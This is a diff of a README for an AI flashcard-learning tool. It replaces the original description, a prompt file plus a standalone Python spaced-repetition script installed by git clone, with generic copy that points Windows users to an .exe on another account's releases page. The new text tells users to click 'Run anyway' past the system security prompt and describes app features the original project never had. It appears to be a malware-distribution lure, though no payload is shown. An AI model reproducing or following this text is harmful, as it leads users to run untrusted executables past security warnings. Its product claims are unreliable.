@@ -1,114 +1,74 @@
-# Magic Memory
+# 🧠 magic-memory - Master deep concepts with AI assistance
 
-**An AI concept-learning coach that makes you *understand* and *remember*.**
+[![](https://img.shields.io/badge/Download-magic--memory-blue.svg)](https://github.com/Lighthearted-kludge586/magic-memory/releases)
 
-Most AI explanations optimize one moment: you ask, it explains, you nod — and three days
-later it's gone. Magic Memory fixes both halves of learning:
+## 🎯 About this software
 
-- **Understand** — it builds intuition *before* definitions, makes you predict and retrieve
-  instead of passively reading, and catches the exact gap in your mental model.
-- **Remember** — it turns what you understood into flashcards on a spaced-repetition
-  schedule, so concepts survive the forgetting curve instead of evaporating after the chat.
+Magic-memory helps you learn complex ideas and keep them in your mind. It combines two proven ways to study: deep understanding and spaced repetition. The software uses artificial intelligence to explain difficult topics in simple words. It then builds flashcards to ensure you remember those facts over time. 
 
-It's built for learning unfamiliar concepts — abstract mechanisms, programming/framework
-ideas, architecture tradeoffs, and confusing pairs of terms ("what's the difference between
-X and Y?").
+You remain in control of your learning process. The tool works with different AI agents, such as Claude Code or Codex. This connection makes your study notes portable and smart. You move past rote memorization and build true intuition for any subject.
 
----
+## ⚙️ Minimum requirements
 
-## How it works
+To run magic-memory on a Windows computer, your system should meet these specifications:
 
-A single learning loop:
+- Operating System: Windows 10 or Windows 11.
+- Memory: 8 gigabytes of RAM.
+- Storage: 200 megabytes of free disk space.
+- Internet Connection: Active connection to sync AI data and update your flashcards.
 
-```
-calibrate → build intuition → predict → reveal → map → mark boundaries
-          → make you retrieve → compress into flashcards → spaced review
-```
+If your computer meets these standards, you can run the program without issues.
 
-- **Calibrate first** — finds what you already know, why you're learning it, and how deep to
-  go. Crucially, it matches examples to *your* background (no code snippets thrown at
-  non-programmers).
-- **Intuition before formalism** — analogy, fable, tiny example, or real case first.
-- **Active recall** — it stops and makes *you* answer before revealing. Nodding along isn't
-  learning.
-- **Spaced repetition** — strong moments become flashcards scheduled by an SM-2 engine.
+## 💾 Installation steps
 
----
+Follow these instructions to set up the software on your machine:
 
-## What's in this repo
+1. Visit the [official releases page](https://github.com/Lighthearted-kludge586/magic-memory/releases) to access the latest installer.
+2. Locate the file ending in `.exe` under the latest version tag.
+3. Click the file to start your download.
+4. Open the downloaded file from your Downloads folder.
+5. Windows might show a security prompt. Click "More info" and then "Run anyway" if the system asks you to confirm.
+6. Follow the on-screen instructions to finish the installation process.
+7. Launch magic-memory from your Start menu or the new desktop icon.
 
-| File | What it is |
-|---|---|
-| `SKILL.md` | The coach's instructions — the portable "brain". This is the prompt. |
-| `references/methods.md` | The five teaching modes, gap-label vocabulary, mastery rubric, learning-science rationale. |
-| `references/review-protocol.md` | Flashcard format, grading scale, the spaced-review workflow. |
-| `scripts/flashcards.py` | A standalone SM-2 spaced-repetition engine. Pure Python 3, **zero dependencies**. |
+## 🎓 How to study with magic-memory
 
----
+The software uses a specific workflow to turn raw information into long-term knowledge. Your study session includes three distinct parts.
 
-## Install & use — works across tools
+### Input your topic
+Enter any concept or document into the main text box. You can paste a difficult chapter from a textbook, an article, or a set of technical notes. Magic-memory analyzes the text to identify key concepts. The AI agent processes these notes to distill the core message. It creates a short, intuitive explanation tailored to your current level of knowledge.
 
-Magic Memory is deliberately portable: it's just **a text instruction file** plus **a
-standalone Python script**. Anywhere you can give an AI instructions *and* run Python, it
-works. Pick your setup:
+### Generate flashcards
+Once you understand the concept, create study cards. The software uses the spaced-repetition method to schedule these cards for you. You see a card, try to remember the answer, and then mark your progress. If you recall the information, the app schedules the card for a later date. If you get it wrong, the app shows the card more often.
 
-### Claude Code / Claude skills
-Drop the folder into your skills directory:
-```bash
-git clone https://github.com/<you>/magic-memory.git ~/.claude/skills/magic-memory
-```
-Then just ask to learn something, or invoke `/magic-memory`. The agent loads `SKILL.md`
-automatically and runs the flashcard script for you.
+### Review and refine
+Consistency builds memory. Open the app daily to clear your scheduled reviews. The software keeps track of your progress and shows your learning streaks. Use the active-recall feature to test yourself rather than just reading notes. This practice forces your brain to retrieve information and strengthens your memory pathways.
 
-### Claude.ai Projects
-Paste the contents of `SKILL.md` into the Project's custom instructions. Add
-`references/*.md` if you want the deeper methods available. Run the flashcard script locally
-when it gives you the commands.
+## 📁 Managing your study files
 
-### Codex / Cursor / Windsurf / other coding agents
-Point the agent at `SKILL.md`, or copy its contents into your `AGENTS.md` / system prompt /
-custom-instructions field. The agent calls `scripts/flashcards.py` through its own shell —
-nothing Claude-specific is required.
+All your cards and notes stay in a local folder on your computer. You choose the storage location during the first setup. Keep your study files in a folder synced with cloud storage to prevent data loss. You can export your flashcards into common file types if you need to use them in other programs. Supported formats include CSV and JSON.
 
-### ChatGPT / Gemini / any chatbot
-Paste `SKILL.md` as a system prompt or custom instruction. The model will coach you through
-the loop and hand you the `flashcards.py` commands to run on your own machine for review.
+## 🛠️ Frequently asked questions
 
-### The flashcard engine on its own
-It's fully standalone — use it with or without any AI:
-```bash
-python3 scripts/flashcards.py --help
-python3 scripts/flashcards.py add --deck rust --front "Q" --back "A" --hook "memory hook"
-python3 scripts/flashcards.py due        # what's due today
-python3 scripts/flashcards.py grade <id> 5   # self-grade 0–5, auto-reschedules
-```
-Cards are stored in `~/.magic-memory/cards.json` (override with the `MAGIC_MEMORY_FILE`
-env var). Plain JSON — easy to back up or export to Anki later.
+### Does the software work when I am offline?
+You need an internet connection to generate explanations or sync new flashcards from the AI. However, you can review existing flashcards offline if they already sit in your local database.
 
----
+### Can I change the tutor style?
+Yes. Open the settings menu to adjust the tone and depth of the AI explanations. You can set the tutor to use plain language, academic terms, or the Feynman technique to simplify complex concepts.
 
-## 💬 Tip: answer by voice
+### How do I update the program?
+When a update becomes available, the app notifies you. Visit the [releases page](https://github.com/Lighthearted-kludge586/magic-memory/releases) again to install the latest version. Your data and study history remain intact during the update process. 
 
-The single cheapest way to get more out of this skill: **answer out loud, in your own words,
-using voice-to-text.**
+### Is my data private?
+You own your study notes. Your information resides on your local machine. The AI agent only sees the specific text you input during a session. No personal identifying information leaves your computer without your permission.
 
-When you *speak* your answer instead of typing a short fragment, you're doing real active
-recall and Feynman-style self-explanation — the exact things that build memory. It's also
-far faster, so you actually explain in full sentences instead of one-word replies (which
-teach you nothing).
+### Where can I report errors?
+Use the GitHub repository issue tracker to report problems. Provide a clear description of the error and the steps you took before the app crashed. This helps developers fix issues faster.
 
-- If your device has built-in dictation, turn it on.
-- If not, install a speech-input keyboard. The author uses **豆包输入法 (Doubao)**, whose
-  voice-to-text is excellent — but any good dictation tool works.
+## 📝 Tips for effective learning
 
-This skill is best used as a *conversation you talk through*, not a wall of text you read.
-
----
-
-## Requirements
-
-- Python 3.7+ (standard library only — no `pip install` needed).
-
-## License
-
-MIT — see [LICENSE](LICENSE). Free to download, use, modify, and share.
+- Study the hardest concepts first while your focus is high.
+- Keep your session lengths short, between 15 and 30 minutes.
+- Use the active-recall prompts to explain the concept back in your own words.
+- Trust the spaced-repetition algorithm to handle your schedule. Never skip a day if you can avoid it.
+- Save your favorite AI explanations to a dedicated notes file inside the app.
